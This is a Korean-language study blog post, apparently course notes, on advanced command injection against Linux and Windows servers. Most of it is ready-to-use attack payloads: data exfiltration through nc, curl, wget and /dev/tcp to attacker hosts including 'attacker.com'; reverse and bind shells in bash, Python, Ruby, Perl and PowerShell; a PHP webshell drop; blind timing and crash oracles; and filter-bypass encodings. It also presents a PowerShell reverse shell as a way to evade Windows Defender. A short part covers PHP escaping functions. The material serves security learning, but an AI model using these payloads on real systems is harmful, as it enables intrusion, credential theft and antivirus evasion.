---
title: "[2025-07-26] Command Injection 심화"
excerpt: "Command Injection 심화"

categories:
  - Justice
tags:
  - [Command Injection]

permalink: /Justice/[2025-07-26] Command Injection 심화/

toc: true
toc_sticky: true

date: 2025-07-26
last_modified_at: 2025-07-26
---

## 🦥 본문

## Command Injection for Linux

### Blind Command Injection

- Network Outbound : 명령 실행 결과를 공격자가 제어하는 외부 서버로 전송하도록 만들어 결과를 간접 확인하는 공격 기법
    - 조건 : 서버에 네트워크 도구를 설치할 수 있거나 설치되었을 때 사용 가능한 방법
    - 명령어
        - nc(netcat) : TCP, UDP 프로토콜에서 데이터를 송수신하는 프로그램. 앞 선 명령어의 결과를 송신함.
            
            ```php
            cat /etc/passwd | nc 127.0.0.1 8000
            ```
            
        - telnet : 네트워크 연결에 사용하는 프로토콜. nc와 같은 방식으로 사용
        - curl/wget : 웹 서버의 컨텐츠를 가져오는 프로그램. 명령어의 실행 결과를 웹서버의 경로나 Body에 포함하여 전송.
            
            ```php
            curl "http://127.0.0.1:8080/?$(ls -al|base64 -w0)"
            
            //POST
            curl http://127.0.0.1:8080/ -d "$(ls -al)"
            wget http://127.0.0.1:8080 --method=POST --body-data="`ls -al`"
            ```
            
        - /dev/tcp & /dev/udp : Bash에서 지원하는 네트워크 연결 방법
            
            ```php
            cat /etc/passwd > /dev/tcp/127.0.0.1/8080
            ```
            
    - EX)
        
        ```php
        name=John; curl http://attacker.com/$(whoami)
        ```
        
- Reverse & Bind Shell : 임의로 실행할 명령어를 네트워크를 통해 입력하고 실행 결과를 출력하는 공격 기법. 인/아웃 바운드 제한이 있으면 공격 불가
    - Reverse Shell : 공격 대상 서버에서 공격자의 서버로 셸을 연결하는 것
        - sh & Bash 이용 : /dev/tcp & /dev/udp를 이용하여 셸 획득 가능
            
            ```php
            //공격 대상 서버
            /bin/sh -i >& /dev/tcp/127.0.0.1/8080 0>&1
            /bin/sh -i >& /dev/udp/127.0.0.1/8080 0>&1
            
            //공격자 서버
            $ nc -l -p 8080 -k -v
            Listening on [0.0.0.0] (family 0, port 8080)
            Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 42202)
            $ id
            uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
            ```
            
        - 언어 사용 : 명령줄에서 소켓을 사용하여 셸 획득
        
        ```python
        //파이썬 이용
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
        //루비 이용
        ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
        ```
        
    - Bind Shell : 공격 대상 서버에서 특정 포트를 열어 공격자가 접속하여 셸을 서비스하는 것
        - nc : -e 옵션을 통해 특정 포트에 임의 서비스를 등록
            
            ```python
            nc -nlvp 8080 -e /bin/sh
            ncat -nlvp 8080 -e /bin/sh
            ```
            
        - 언어 사용 : Perl 스크립트를 작성하는 방법
            
            ```python
            perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
            ```
            
- 파일 생성 : 접근 가능한 파일 시스템 경로에 명령어의 실행 결과를 저장하는 파일을 생성하는 방법
    - Script Engine : webShell 업로드 후 실행
        
        ```python
        printf '<?=system($_GET[0])?>' > /var/www/html/uploads/shell.php
        ```
        
    - Static File Directory : 정적 리소스를 다루기 위한 Directory. static으로 설정
        - 조건 : 디렉터리에 파일 생성 권한이 있어야 함
        
        ```python
        mkdir static; id > static/result.txt
        ```
        
- 참/거짓 비교문 : sleep, Dos(에러) 방법 사용
    - sleep : 앞 명령어가 참인 경우 sleep 실행
        
        ```python
        bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then sleep 2; fi;" # --> sleep for 2 seconds; true
        bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then sleep 2; fi;" # --> sleep for 2 seconds; true
        bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then sleep 2; fi;" # --> sleep for 0 seconds; false
        bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then sleep 2; fi;" # --> sleep for 2 seconds; true
        ```
        
    - Dos : 앞 명령어가 참인 경우 메모리가 많이 소모하는 명령어를 입력하여 500 error 발생. 주로 `cat /dev/urandom` 사용
        
        ```python
        bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then cat /dev/urandom; fi;" # --> 500 true
        bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then cat /dev/urandom; fi;" # --> 500 true
        bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then cat /dev/urandom; fi;" # --> 200 false
        bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then cat /dev/urandom; fi;" # --> 500 true
        ```
        

### Payload 길이 제한

- Redirction 사용 : Redirection(>)을 이용하여 조각 단위로 파일에 나눠서 씀 임의 디렉토리에 파일 생성 후 Bash 또는 파이썬과 같은 인터프리터 이용하여 공격
    
    ```python
    printf bas>/tmp/1
    printf h>>/tmp/1
    printf \<>>/tmp/1
    printf /d>>/tmp/1
    printf ev>>/tmp/1
    printf /t>>/tmp/1
    printf cp>>/tmp/1
    printf />>/tmp/1
    printf 1 >>/tmp/1
    printf 2 >>/tmp/1
    printf 7.>>/tmp/1
    printf 0.>>/tmp/1
    printf 0.>>/tmp/1
    printf 1/>>/tmp/1
    printf 1 >>/tmp/1
    printf 2 >>/tmp/1
    printf 3 >>/tmp/1
    printf 4 >>/tmp/1
    bash</tmp/1&
    
    --> bash -i /dev/tcp127.0.0.11234
    ```
    
    /tmp 디렉터리는 누구나 읽고 쓸 수 있는 권한이 존재하기 때문에 1이라는 파일을 생성 후 문자열 삽입. `bash</tmp/1&` 을 입력하면 생성한 파일을 Bash를 통해 실행 
    
    ※ 명령어 중 숫자가 포함된 경우 Bash에서  파일 디스크립터로 인식할 수 있기 때문에 띄어쓰기 삽입.
    
- 네트워크 도구 사용 : IP 주소를 짧게 변환하기 위해서 IP 형식을 long 자료형으로 변환하는 경우가 있음
    
    ```python
    #!/usr/bin/python3
    import ipaddress
    int(ipaddress.IPv4Address("192.168.0.13")) # 3232235533
    ```
    
    - 공격 흐름
        1. 공격자가 리버스 쉘 스크립트를 웹서버에 올려둠
            
            ```python
            python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("127.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
            ```
            
        2. 대상 서버가 `curl attacker.com` 을 실행하도록 유도
            
            ```python
            curl 2130706433|sh
            $(curl 2130706433)
            `curl 2130706433`
            ```
            

### 입력 값 제한

- 공백 문자 우회 : IFS 사용
    - IFS : 환경 변수. 문자열을 나눌 때 기준이 되는 문자
        
        ```python
        cat${IFS}/etc/passwd
        cat$IFS/etc/passwd
        X=$'\x20';cat${X}/etc/passwd
        X=$'\040';cat${X}/etc/passwd
        {cat,/etc/passwd}
        cat</etc/passwd
        ```
        
- 키워드 필터링 우회
    - EX1) cat 문자열 필터링 우회
        
        ```python
        /bin/c?t /etc/passwd
        /bin/ca* /etc/passwd
        c''a""t /etc/passwd
        \c\a\t /etc/passwd
        c${invalid_variable}a${XX}t /etc/passwd
        ```
        
    - EX2) id 문자열 필터링 우회
        
        ```python
        echo -e "\x69\x64" | sh
        echo $'\151\144'| sh
        X=$'\x69\x64'; sh -c $X
        ```
        
    - EX3) /etc/passwd 문자열 우회
        
        ```python
        cat `xxd -r -p <<< 2f6574632f706173737764`
        ```
        

## Command Injection for Windows

### 메타 문자 및 명령어

- 메타 문자

| Linux | Windows (cmd / PowerShell) | 설명 |
| --- | --- | --- |
| `-A, --A` | `/c` | 커맨드 라인 옵션 |
| `$PATH` | `%PATH%` | 환경 변수 |
| `$ABCD` | `$ABCD` (PowerShell only) | 쉘 변수 |
| `;` | `&` (cmd only), `;` (PowerShell only) | 명령어 구분자 |
| `echo $(id)` | `for /f "delims=" %a in ('whoami') do echo %a` | 명령어 치환 |
| `> /dev/null` | `> NUL` (cmd only), ` | Out-Null` (PowerShell only) |
| `command |  | true` |
- 명령어

| Linux | Windows | 설명 |
| --- | --- | --- |
| `ls` | `dir` | 디렉토리(폴더) 파일 목록 출력 |
| `cat` | `type` | 파일 내용 출력 |
| `cd` | `cd` | 디렉토리(폴더) 이동 |
| `rm` | `del` | 파일 삭제 |
| `mv` | `move` | 파일 이동 |
| `cp` | `copy` | 파일 복사 |
| `ifconfig` | `ipconfig` | 네트워크 설정 |
| `env`, `export` | `set` | 환경변수 설정 |

### 리버스 셸

윈도우는 **윈도우 디펜더(Windows Defender)**가 악성 스크립트를 감지하고 실행하지 않음 

- 우회 코드

```python
$client = New-Object System.Net.Sockets.TCPClient("123.123.124.124",1234);
$x = Get-Random;
if ($x -ge 1) {
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()
    };
    $client.Close();
} else {
    $client.Close();
}
```

`Get-Random`  메소드를 이용하여 무작위 값 생성 후, 해당 값이 1보다 큰 값이지 확인한 뒤 리버스 셸 코드 실행 

## Command Injection Vulnerability

### ruby & perl

- open 함수 : 파일명이 전달되는 경우 파일을 읽거나 쓸 수 있음. 첫번째 인자가 `|` 인 경우 pipe_open 함수에서 처리
    - pipe_open_s 실행 과정 : `open` 함수의 코드
    
    ```python
    rb_define_global_function("open", rb_f_open, -1);
    static VALUE rb_f_open(int argc, VALUE *argv, VALUE _) {
      ID to_open = 0;
      int redirect = FALSE;
      if (argc >= 1) {
        CONST_ID(to_open, "to_open");
        if (rb_respond_to(argv[0], to_open)) {
          redirect = TRUE;
        } else {
          VALUE tmp = argv[0];
          FilePathValue(tmp);
          if (NIL_P(tmp)) {
            redirect = TRUE;
          } else {
            VALUE cmd = check_pipe_command(tmp);
            if (!NIL_P(cmd)) {
              argv[0] = cmd;
              return rb_io_s_popen(argc, argv, rb_cIO);
            }
          }
        }
      }
      ...
    }
    static VALUE check_pipe_command(VALUE filename_or_command) {
      char *s = RSTRING_PTR(filename_or_command);
      long l = RSTRING_LEN(filename_or_command);
      char *e = s + l;
      int chlen;
      if (rb_enc_ascget(s, e, &chlen, rb_enc_get(filename_or_command)) == '|') {
        VALUE cmd = rb_str_new(s + chlen, l - chlen);
        return cmd;
      }
      return Qnil;
    }
    ```
    
    1. 전달된 인자가 존재하는 경우 `check_pipe_command` 함수 호출
    2. `check_pipe_command` 를 통해 `|` 확인
    3. 포함된 경우 인자 반환 후 `rb_f_open` 함수에서 `rb_io_s_popen` 호출
    4. 공격자가 인자를 조작할 수 있는 경우 `rb_io_s_popen` 을 통해 Command Injection 발생 
        1. `rb_io_s_popen` 이외에도  `rb_io_open_generic` 등으로 Command Injection 발생 가능
    - 공격 예시
    
    ```python
    irb(main):001:0> open("|id > /tmp/1") //id 명령을 실행하고 그 출력을 /tmp/1에 저장
    => #<IO:fd 11>
    irb(main):002:0> IO.read("/tmp/1") //
    irb(main):003:0> IO.read("|id") //id 명령 실행 결과를 문자열로 반환
    irb(main):004:0> IO.binread("|id")
    //위의 명령어들 모두 아래와 같은 결과 발생
    => "uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)\n"
    irb(main):005:0>
    ----
    $ perl -e 'open A, "|id"'
    uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
    ```
    

### PHP

- escapeshellcmd() : 명령어 자체에 메타 문자가 삽입되어 커맨드 인젝션이 발생하는 것을 방지하는 메소드
    - EX)
        
        ```python
        //취약 코드
        <?php
          $cmd = "ls ".$_GET['filename']." 2>&1";
          system($cmd);
        ?>
        
        //보완 코드
        <?php
          $cmd = "ls ".escapeshellcmd($_GET['filename'])." 2>&1";
          system($cmd);
        ?>
        ```
        
    - 특정 명령어의 인자로 입력값이 전달되는 경우 공격자는 실행하려는 명령어의 옵션 조작 가
- escapeshellarg() : 명령어의 인자 전체를 따옴표로 감싸서 인자를 보호하는 메소드
    - EX)
        
        ```python
        var_dump(escapeshellcmd("a -h -d -e"));
        // 출력: string(12) "a -h -d -e"
        
        var_dump(escapeshellarg("a -h -d -e"));
        // 출력: string(14) "'a -h -d -e'"
        ```
        
        ```python
        dreamhack@ubuntu:~$ curl 'http://dreamhack.local/cmdi.php?filename=-al%20/etc/passwd;%20id'
        ls: cannot access '/etc/passwd;': No such file or directory
        ls: cannot access 'id': No such file or directory
        dreamhack@ubuntu:~$ curl 'http://dreamhack.local/cmdi.php?filename=-al%20/etc/passwd'
        -rw-r--r-- 1 root root 1602 May  4 04:35 /etc/passwd
        ```
        
- 공격 예시
    - zip : 압축 파일을 생성하거나 해제하는 명령어 `--unzip-command` 인자를 이용해 인자로 전달된 명령어를 실행
        
        ```python
        $ zip /tmp/test.zip /etc/passwd -T --unzip-command="sh -c id"
        updating: etc/passwd (deflated 64%)
        uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
        test of /tmp/test.zip OK
        ```
        
    - python : `-c` 옵션을 통해 명령줄로 코드를 실행할 수 있다
        
        ```python
        $ python -c '__import__("os").system("id")' input.py
        uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
        ```
        
    - curl : 전달된 URL에 접속하는 CLI 프로그램. 실행은 할 수 없지만 `-o` 옵션을 통해 임의 경로에 파일을 저장 가능
        
        ```python
        $ curl  http://dreamhack.local -o /tmp/hello.txt
        Hello !
        $ cat /tmp/hello.txt
        Hello !
        ```
        
    - wget : 전달된 URL에 접속해 파일을 다운로드하는 용도로 사용되는 프로그램. `-O` 옵션을 통해 임의 경로에 파일 저장 가능
        
        ```python
        $ wget http://dreamhack.local -O hello.txt
        --2020-05-20 14:28:56--  http://dreamhack.local/
        Resolving dreamhack.local (dreamhack.local)... 127.0.0.1
        Connecting to dreamhack.local (dreamhack.local)|127.0.0.1|:80... connected.
        HTTP request sent, awaiting response... 200 OK
        Length: 288 [text/html]
        Saving to: ‘/tmp/hello.txt’
        /tmp/hello.txt                    100%[============================================>]     288  --.-KB/s    in 0s      
        2020-05-20 14:28:56 (22.9 MB/s) - ‘/tmp/hello.txt’ saved [288/288]
        $ cat /tmp/hello.txt
        Hello !
        ```